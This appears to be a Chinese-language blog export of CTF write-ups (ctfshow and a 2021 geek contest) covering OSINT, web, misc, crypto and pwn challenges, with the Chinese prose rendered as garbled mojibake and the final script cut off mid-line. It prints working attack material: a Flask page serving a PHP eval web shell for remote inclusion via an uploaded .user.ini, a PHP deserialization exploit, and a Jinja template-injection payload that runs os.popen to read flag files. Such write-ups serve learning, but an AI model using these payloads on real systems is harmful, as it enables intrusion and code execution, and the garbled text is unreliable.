<h2 id="çœ‹å›¾è¯†ç "><a href="#çœ‹å›¾è¯†ç " class="headerlink" title="çœ‹å›¾è¯†ç "></a>çœ‹å›¾è¯†ç </h2><p>ç½‘é¡µæ˜¯ä¸€å¼ å¤§çš„äºŒç»´ç ï¼Œä½†æ˜¯æœ‰å››ä¸ªå®šä½ç¬¦å°±å¾ˆå¥‡æ€ªï¼Œæ ¹æ®hintï¼Œåˆ†ç¦»å‡ºå››ä¸ªå°äºŒç»´ç <br>ç”¨äºŒç»´ç ç¥å™¨<code>cortexscan</code>é€ä¸€æ‰«æï¼Œç„¶åæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå°±æ˜¯flagå•¦<br><img src="/img/ctfshow/jjb-2.png"></p>
<h2 id="çœ‹å›¾è¯†å¦¹"><a href="#çœ‹å›¾è¯†å¦¹" class="headerlink" title="çœ‹å›¾è¯†å¦¹"></a>çœ‹å›¾è¯†å¦¹</h2><p>ç›´æ¥è´´å¤§ä½¬çš„è„šæœ¬äº†<br>æ³¨æ„è¦ä¸‹ä¸ª<code>chromedriver.exe</code><br><a href="https://chromedriver.chromium.org/home">ç½‘å€</a>,ç‰ˆæœ¬è¦ä¸chromeä¸€è‡´</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_to_get_ans</span>(<span class="hljs-params">session, url</span>):<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;session=<span class="hljs-subst">&#123;session&#125;</span>&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product([<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>], [<span class="hljs-built_in">str</span>(n) <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]):<br>        chk = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/check&#x27;</span>, &#123;<span class="hljs-string">&#x27;meizi_id&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>.join(i)&#125;, headers=headers).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;å›ç­”é”™è¯¯ï¼Œè½®æ•°é‡æ–°å¼€å§‹è®¡ç®—&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> chk:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br><br><br>driver = webdriver.Chrome(<span class="hljs-string">r&#x27;chromedriver.exe&#x27;</span>)<br>url = <span class="hljs-string">&#x27;http://002b1a4d-e639-4e31-b149-dd0fb39d779d.challenge.ctf.show/&#x27;</span><br><br>driver.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/start&#x27;</span>)<br>n = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> n &lt;= <span class="hljs-number">100</span>:<br>    cke = driver.get_cookie(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    ans=force_to_get_ans(cke, url)<br>    driver.find_element_by_name(<span class="hljs-string">&#x27;meizi_id&#x27;</span>).send_keys(ans)<br>    driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/form/p[4]/button&#x27;</span>).click()<br>    sleep(<span class="hljs-number">3</span>)<br>    n+=1s<br></code></pre></td></tr></table></figure>


<h2 id="è§å¾®çŸ¥è‘—"><a href="#è§å¾®çŸ¥è‘—" class="headerlink" title="è§å¾®çŸ¥è‘—"></a>è§å¾®çŸ¥è‘—</h2><p>è¿œç¨‹æ–‡ä»¶åŒ…å«<br>å…ˆåœ¨æœåŠ¡å™¨ä¸Šç”¨flaskæ­å»ºä¸€ä¸ªç½‘é¡µ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>è¿è¡Œ<br><img src="/img/ctfshow/jjb-3.png"></p>
<p>ä¸Šä¼ ä¸€ä¸ª<code>.user.ini</code>æ–‡ä»¶ç”¨æ¥è¿œç¨‹åŒ…å«<br><img src="/img/ctfshow/jjb-4.png"></p>
<p>å› ä¸ºåŠ äº†å¤´æ£€æµ‹ï¼Œæ‰€ä»¥éœ€è¦åœ¨æ–‡ä»¶å‰åŠ ä¸Š<code>GIF89a</code><br>åœ¨è¿™ä¸ªç¯å¢ƒä¸­ï¼Œç‚¹ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥éœ€è¦å°†ipè½¬ä¸ºæ•°å­—<br><a href="http://www.jsons.cn/ipnum/">åœ¨çº¿è½¬æ¢</a><br><img src="/img/ctfshow/jjb-5.png"></p>
<p>è®¿é—®uploadå³å¯è¿œç¨‹åŒ…å«<br><img src="/img/ctfshow/jjb-6.png"></p>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="è‹±è¯­é˜…è¯»"><a href="#è‹±è¯­é˜…è¯»" class="headerlink" title="è‹±è¯­é˜…è¯»"></a>è‹±è¯­é˜…è¯»</h2><p>OSINTçš„å…¨ç§°æ˜¯<code>Open source intelligence</code><br>æ ¹æ®è¿™ä¸ªè¿›è¡Œå…³é”®è¯æœç´¢<br>ç¬¬ä¸€ç¯‡å°±æ˜¯<br><img src="/img/ctfshow/jjb-7.png"><br>å¼€å¤´å°±æ˜¯äººå<br><img src="/img/ctfshow/jjb-8.png"><br>flagä¸º<code>ctfshow&#123;Bill_Donovan&#125;</code></p>
<h2 id="è¿™æ˜¯å“ªé‡Œ"><a href="#è¿™æ˜¯å“ªé‡Œ" class="headerlink" title="è¿™æ˜¯å“ªé‡Œ"></a>è¿™æ˜¯å“ªé‡Œ</h2><p>å›¾ç‰‡å¾ˆå¤§ï¼Œå°†ä¸»è¦ä¿¡æ¯äººç‰©æˆªå›¾å†ç™¾åº¦æœå›¾<br><img src="/img/ctfshow/jjb-9.png"><br>åœ¨è´´å§ä¸­å¾—åˆ°ä¿¡æ¯<code>æ¼³å·å¸‚ä¸œå±±å¿é»„é“å‘¨å…¬å›­</code><br>æŸ¥è¯¢ç»çº¬åº¦<br><img src="/img/ctfshow/jjb-10.png"><br><code>ctfshow&#123;23.7353_117.5125&#125;</code></p>
<h2 id="å¡é²é“ç›’"><a href="#å¡é²é“ç›’" class="headerlink" title="å¡é²é“ç›’"></a>å¡é²é“ç›’</h2><p>è°·æ­Œæœå›¾å¯ä»¥æ‰¾åˆ°<a href="https://geckosint.medium.com/10-beginner-osint-ctf-solutions-ae89e557a4b">åŸé¢˜</a></p>
<p>æ ¹æ®é¢˜ç›®ç»™å‡ºçš„<a href="https://www.track-trace.com/">ç½‘å€</a>æœç´¢ç¼–å·ï¼Œæ‰¾åˆ°æ¸¯å£å’Œcscç¼–å·<br><img src="/img/ctfshow/jjb-11.png"><br>æ³¨æ„åç§°å…¨å¤§å†™<br>flag:<code>ctfshow&#123;FBV854404_ROTTERDAM&#125;</code></p>
<h2 id="äººå®¶æƒ³ç©å˜›"><a href="#äººå®¶æƒ³ç©å˜›" class="headerlink" title="äººå®¶æƒ³ç©å˜›"></a>äººå®¶æƒ³ç©å˜›</h2><blockquote>
<p>ctfshow{å¨±ä¹é¡¹ç›®åç§°-å½“åœ°è¯¥å¨±ä¹é¡¹ç›®ç¥¨ä»·-è®¢ç¥¨å¢å€¼ç¨}</p>
</blockquote>
<p>ç™¾åº¦è¯†å›¾<br>å¾—åˆ°ä½ç½®ä¸º<code>è¿ªæ‹œè´­ç‰©ä¸­å¿ƒå–·æ³‰</code><br><img src="/img/ctfshow/jjb-12.png"></p>
<p>é€šè¿‡è°·æ­Œåœ°å›¾å¯ä»¥å¾—çŸ¥é™„è¿‘çš„æ™¯ç‚¹<code>lake fountain ride</code><br><img src="/img/ctfshow/jjb-13.png"></p>
<p>è°·æ­Œæœç´¢<code>lake fountain ride ä¹°ç¥¨</code>ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯èƒ½æ˜¯å®˜ç½‘çš„åœ°æ–¹ï¼Œæ ‡ç€ç¥¨ä»·<code>65</code>æ¯äºº<br><img src="/img/ctfshow/jjb-14.png"></p>
<p>ç‚¹å³è¾¹çš„åœ¨çº¿è´­ç¥¨<br>å¾—åˆ°å¢å€¼ç¨ä¸º<code>5%</code><br><img src="/img/ctfshow/jjb-15.png"></p>
<p>æœ€åçš„ç»“æœè¦å°†<code>fountain</code>å»æ‰<br>flagä¸º<code>ctfshow&#123;LAKE_RIDE-65-5%&#125;</code></p>
<h2 id="äººæœ‰ç‚¹å¤š"><a href="#äººæœ‰ç‚¹å¤š" class="headerlink" title="äººæœ‰ç‚¹å¤š"></a>äººæœ‰ç‚¹å¤š</h2><p>ç™¾åº¦è¯†å›¾æˆ–è€…è°·æ­Œè¯†å›¾éƒ½å¯ä»¥å¾—å‡ºåœ°ç‚¹<code>æ¶©è°·</code>ï¼Œå›¾ä¸­æ˜¯æ¶©è°·çš„æ ‡å¿—æ€§è¡—é“<br>è°·æ­Œåœ°å›¾å¯ä»¥å¾—åˆ°åº—é“ºåå­—<code>BIC_CAMERA</code>å’Œç”µè¯å·ç åå››ä½<code>1111</code><br>BIC_CAMERAæœ‰å®˜ç½‘ï¼Œæ‰¾åˆ°çº¿è·¯å›¾ï¼Œå¯ä»¥å¾—çŸ¥æœ€è¿‘çš„æ˜¯<code>å‰¯éƒ½å¿ƒçº¿</code><br><img src="/img/ctfshow/jjb-16.png"></p>
<p>è°·æ­Œæˆ–è€…wikié‡Œéƒ½å¯ä»¥å¾—åˆ°<code>å‰¯éƒ½å¿ƒçº¿</code>çš„ç¼–å·ä¸º<code>F16</code><br><img src="/img/ctfshow/jjb-17.png"></p>
<p>å…¶å®ä¸Šé¢çš„çº¿è·¯å›¾å·²ç»å¯ä»¥çœ‹å‡ºå‡ºå£æ˜¯<code>B2</code>äº†ï¼Œä½†æ˜¯è¿™é¢˜å‘å°±åœ¨è¿™é‡Œï¼Œè¿˜éœ€è¦åœ¨B2å‰åŠ ä¸Šä¸ª<code>10</code><br><img src="/img/ctfshow/jjb-18.png"></p>
<p>flagä¸º<code>ctfshow&#123;BIC_CAMERA-1111-10B2-F16&#125;</code></p>
<h2 id="å°åŸç¾é£Ÿ"><a href="#å°åŸç¾é£Ÿ" class="headerlink" title="å°åŸç¾é£Ÿ"></a>å°åŸç¾é£Ÿ</h2><blockquote>
<p>flagæ ¼å¼ï¼šctfshow{XçœXå¸‚XåŒºXæ‘Xå·}</p>
</blockquote>
<p>ç™¾åº¦è¯†å›¾<br><img src="/img/ctfshow/jjb-19.png"></p>
<p>å…³é”®è¯æœç´¢<br><img src="/img/ctfshow/jjb-20.png"></p>
<p>æ‹¼æ¥ä¸€ä¸‹ï¼Œå¾—åˆ°<code>æµ™æ±Ÿçœè¡¢å·å¸‚æŸ¯åŸåŒºé¾šå®¶åŸ å¤´æ‘28å·</code><br><img src="/img/ctfshow/jjb-21.png"></p>
<h2 id="å®‰è£…Arch"><a href="#å®‰è£…Arch" class="headerlink" title="å®‰è£…Arch"></a>å®‰è£…Arch</h2><blockquote>
<p>Example ctfshow{BV1GJ411x7h7}</p>
</blockquote>
<p>æ ¹æ®pdfä¸­çš„å‡ ä¸ªå…³é”®ä¿¡æ¯ï¼Œ<code>ç™½è‰²å­—å¹•</code>ï¼Œ<code>è™šæ‹Ÿæœº</code>ï¼Œ<code>å®‰è£…arch</code>ï¼Œåœ¨bç«™æœç´¢archå®‰è£…ï¼Œç„¶åé€šè¿‡å¿«é€Ÿé¢„è§ˆçš„æ–¹å¼ç²—æ»¤æŸ¥çœ‹ï¼Œåœ¨ç»†çœ‹<br>å¾—åˆ°ç»“æœ<br><code>BV1e3411B79M</code><br><img src="/img/ctfshow/jjb-22.png"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ç»™æˆ‘çœ‹çœ‹"><a href="#ç»™æˆ‘çœ‹çœ‹" class="headerlink" title="ç»™æˆ‘çœ‹çœ‹"></a>ç»™æˆ‘çœ‹çœ‹</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whoami</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$your_answer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$useless</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;ctfshowç¬¬ä¸€æ·±æƒ…&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;your_answer=<span class="hljs-string">&#x27;Only you know&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;useless=<span class="hljs-string">&quot;I_love_u&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$you_never_know</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$you_never_know</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;your_answer === <span class="hljs-variable language_">$this</span>-&gt;name)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$secret</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$secret</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$secret</span>===<span class="hljs-string">&quot;ç»™æˆ‘çœ‹çœ‹!&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$secret</span>===<span class="hljs-string">&quot;ç»™æˆ‘çœ‹çœ‹!&quot;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;è¿™æ˜¯ä¸èƒ½è¯´çš„ç§˜å¯†&#x27;);location.href=&#x27;https://www.bilibili.com/video/BV1CW411g7UF&#x27;;&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$secret</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>ç®€å•çš„å˜é‡è¦†ç›–å’Œååºåˆ—åŒ–<br>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whoami</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$your_answer</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;your_answer=&amp;<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">whoami</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>ä»£ç ä½¿ç”¨äº†<code>extract</code>å‡½æ•°ï¼Œå®¹æ˜“æ„æˆå˜é‡è¦†ç›–<br><img src="/img/ctfshow/jjb-23.png"></p>
<h2 id="è°æ˜¯CTFä¹‹ç‹ï¼Ÿ"><a href="#è°æ˜¯CTFä¹‹ç‹ï¼Ÿ" class="headerlink" title="è°æ˜¯CTFä¹‹ç‹ï¼Ÿ"></a>è°æ˜¯CTFä¹‹ç‹ï¼Ÿ</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>host = <span class="hljs-string">&#x27;http://cab68c18-4dae-4f19-a5c9-4c4b015acf46.challenge.ctf.show&#x27;</span><br><br>url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>/madlib&#x27;</span><br><br>payload = &#123;<br>        <span class="hljs-string">&quot;verb&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=cycler%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;noun&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=x.__init__%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;adjective&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=x.__globals__&quot;</span>,<br>        <span class="hljs-string">&quot;person&quot;</span>:<span class="hljs-string">&quot;os.popen(&#x27;cat f*&#x27;)%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;place&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;x.read()&#125;&#125;&quot;</span><br>        &#125;<br><br>r = requests.post(url, json=payload)<br><br>flag = re.findall(<span class="hljs-string">r&#x27;ctfshow&#123;.*&#125;&#x27;</span>, r.text)[<span class="hljs-number">0</span>]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ä¸­æ–‡è¯†åˆ«å¸¦å¸ˆ"><a href="#ä¸­æ–‡è¯†åˆ«å¸¦å¸ˆ" class="headerlink" title="ä¸­æ–‡è¯†åˆ«å¸¦å¸ˆ"></a>ä¸­æ–‡è¯†åˆ«å¸¦å¸ˆ</h2><p>åªæœ‰åä¸ªæ±‰å­—ï¼Œç”¨é¼ æ ‡å†™å‡ºæ¥ç™¾åº¦å³å¯<br>è¦æ˜¯å†å¤šä¸€ç‚¹å°±éœ€è¦ç”¨åˆ°å®˜æ–¹wpä¸­çš„è„šæœ¬äº†<br><img src="/img/ctfshow/jjb-24.jpg"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="å•å‘åŠ å¯†"><a href="#å•å‘åŠ å¯†" class="headerlink" title="å•å‘åŠ å¯†"></a>å•å‘åŠ å¯†</h2><p>hintæ˜¯æ–æ³¢é‚£å¥‘<br>æ–‡æœ¬ä¸­ç»“å°¾çš„<code>=I2GWRFMO33EWUZM</code>ä¹Ÿæ˜¯hintï¼Œåè½¬åbase32è§£å¯†ç»“æœä¸º<code>fibonacci</code></p>
<p>å…ˆç”¨è„šæœ¬è·‘å‡ºæ–æ³¢é‚£å¥‘æ•°åˆ—ï¼Œç„¶åä¸æ–‡æœ¬æ¯”è¾ƒï¼Œå‘ç°æ˜¯asciiç ï¼Œè½¬æ¢ä¸€ä¸‹å¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">0</span><br>a=<span class="hljs-number">0</span><br>b=<span class="hljs-number">1</span><br>c=<span class="hljs-number">1</span><br>fs=[<span class="hljs-string">&#x27;1&#x27;</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>	c=b+a<br>	a=b<br>	b=c<br>	<span class="hljs-keyword">if</span> n&gt;<span class="hljs-number">128</span>:<br>		<span class="hljs-keyword">break</span><br>	fs.append(<span class="hljs-built_in">str</span>(b))<br>	n=n+<span class="hljs-number">1</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;code.txt&#x27;</span>)<br>d=f.read()<br>flag=[]<br>l=<span class="hljs-built_in">len</span>(fs)<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d)!=<span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> d.find(fs[i].strip())==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(fs[i].strip(),i+<span class="hljs-number">1</span>)<br>            flag.append(<span class="hljs-built_in">chr</span>(i+<span class="hljs-number">1</span>))<br>            d=d[<span class="hljs-built_in">len</span>(fs[i]):]<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join( flag))<br></code></pre></td></tr></table></figure>

<p><img src="/img/ctfshow/jjb-25.jpg"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ç‚’é¸¡å¥½ç©çš„äº•å­—æ£‹"><a href="#ç‚’é¸¡å¥½ç©çš„äº•å­—æ£‹" class="headerlink" title="ç‚’é¸¡å¥½ç©çš„äº•å­—æ£‹"></a>ç‚’é¸¡å¥½ç©çš„äº•å­—æ£‹</h2><p>æ ¹æ®ç»™çš„cä»£ç ï¼Œå¯ä»¥çŸ¥é“åŸºæœ¬åˆ¤æ–­é€»è¾‘ï¼Œæ£€æŸ¥è¾“å…¥æ˜¯å¦å°äº3ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰è´Ÿå·<br>ä½†æ˜¯æ²¡æœ‰æ£€æµ‹æ£‹å­çš„èŒƒå›´ï¼Œæ‰€ä»¥å¯ä»¥ä¸‹åœ¨<code>-1</code>è¿™æ ·çš„ä½ç½®ï¼Œç”¨<code>2^32-1</code>æ¥è¾“å‡º<code>-1</code></p>
<p>å…ˆæ­£å¸¸ä¸‹ä¸¤ä¸ªç›¸è¿çš„æ£‹å­<br>[0,0],[0,1]<br><img src="/img/ctfshow/jjb-26.png"></p>
<p>ç„¶åè¾“å…¥[0,4294967295],å…¶å®å°±æ˜¯[0,-1]<br>ä¸‰ä¸ªæ£‹å­ä¸€æ¡çº¿ç›¸è¿ï¼Œå¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢æŒ‘æˆ˜2021-misc-wp</title>
    <url>/posts/5c5d1357/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸ªäººæ„Ÿè§‰æœ‰å‡ é¢˜å‡ºçš„ä¸æ˜¯å¾ˆåˆç†ï¼Œä½†è¿˜æ˜¯æœ‰æ”¶è·çš„<br><img src="/img/wp/2021/2021jike-misc-1.png"></p>
<h1 id="In-the-Air"><a href="#In-the-Air" class="headerlink" title="In the Air"></a>In the Air</h1><blockquote>
<p>Intro &amp;&amp; Hint: å–„äºè§‚å¯Ÿè—åœ¨èº«è¾¹çš„ flagï¼Œ æç¤ºï¼šæ— çº¿ç”µä¼šåœ¨ç©ºæ°”ä¸­ä¼ æ’­</p>
</blockquote>
<p>æ²¡å•¥å¥½è¯´çš„ï¼Œåªæœ‰æ ¡å†…èƒ½åšï¼ŒWiFIåå­—å°±æ˜¯flag<br><img src="/img/wp/2021/2021jike-misc-2.png"></p>
<h1 id="easysend"><a href="#easysend" class="headerlink" title="easysend"></a>easysend</h1><blockquote>
<p>Intro &amp;&amp; Hint: (åŒºå—é“¾)æè¿°ï¼šè¯·å‘é€0.1Rosptenæµ‹è¯•å¸åˆ°0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470</p>
</blockquote>
<p>ä½¿ç”¨metamaskå‘é€0.1æµ‹è¯•å¸<br><img src="/img/wp/2021/2021jike-misc-3.png"><br>å¤åˆ¶hashå€¼åˆ°é¢˜ç›®è¿æ¥ä¸­éªŒè¯å³å¯æ‹¿åˆ°flag<br><img src="/img/wp/2021/2021jike-misc-4.png"></p>
<h1 id="è¿™æ˜¯ä»€ä¹ˆå‘½ä»¤"><a href="#è¿™æ˜¯ä»€ä¹ˆå‘½ä»¤" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆå‘½ä»¤"></a>è¿™æ˜¯ä»€ä¹ˆå‘½ä»¤</h1><blockquote>
<p>Intro &amp;&amp; Hint: å‘½ä»¤æ‰§è¡Œçš„vps ipä¸º 110.42.233.91 æ‰§è¡Œçš„å‘½ä»¤ cat flag.png | base64 | base64 | tac | nl | sort -k 2 &gt; flag.txt ;rm -f flag.png &amp; nohup php -S 0.0.0.0:2333 &gt;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</p>
</blockquote>
<p>åˆ†å¼€æ¥åˆ†æ<br>ç¬¬ä¸€éƒ¨åˆ†<code>cat flag.png | base64 | base64 | tac | nl | sort -k 2 &gt; flag.txt </code><br>tacï¼šæ–‡ä»¶å†…å®¹å€’åºè¾“å‡º<br>nlï¼šè¾“å‡ºæ–‡ä»¶å†…å®¹å¹¶åŠ ä¸Šè¡Œå·<br>sort -k 2ï¼šå°†å†…å®¹ä»a-zæ’åºåè¾“å‡º<br>æ‰€ä»¥ç¬¬ä¸€æ¡å‘½ä»¤çš„å«ä¹‰å°±æ˜¯å°†flag.pngä¸¤æ¬¡base64çš„å€¼å€’åºåæŒ‰A-ZåŠ ä¸Šè¡Œå·è¾“å‡ºè‡³flag.txt</p>
<p>ç¬¬äºŒéƒ¨åˆ†<code>rm -f flag.png &amp; nohup php -S 0.0.0.0:2333 &gt;&gt; /dev/null 2&gt;&amp;1 &amp;</code><br>rm -rï¼šåˆ é™¤æ–‡ä»¶<br>nohupï¼šä¸æŒ‚æ–­åœ°è¿è¡Œå‘½ä»¤<br>php -Sï¼šå¯åŠ¨å†…ç½®çš„webæœåŠ¡å™¨<br>æ‰€ä»¥ç¬¬äºŒæ¡å‘½ä»¤çš„å«ä¹‰æ˜¯åˆ é™¤å›¾ç‰‡ï¼Œå¹¶åœ¨åå°ä¸é—´æ–­çš„è¿è¡ŒwebæœåŠ¡å™¨ï¼Œç«¯å£ä¸º2333</p>
<p>ç›´æ¥è®¿é—®<code>http://110.42.233.91:2333/flag.txt</code>ï¼Œæ‹¿åˆ°æ•°æ®ç›´æ¥ä¸Šè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2333.txt&#x27;</span>)<br>d=f.readlines()<br>e=[<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">500</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    ca=i.strip().split()<br>    <span class="hljs-built_in">print</span>(base64.b64decode(ca[<span class="hljs-number">1</span>]))<br>    e[<span class="hljs-built_in">int</span>(ca[<span class="hljs-number">0</span>])]=base64.b64decode(ca[<span class="hljs-number">1</span>])<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2333.png&#x27;</span>,<span 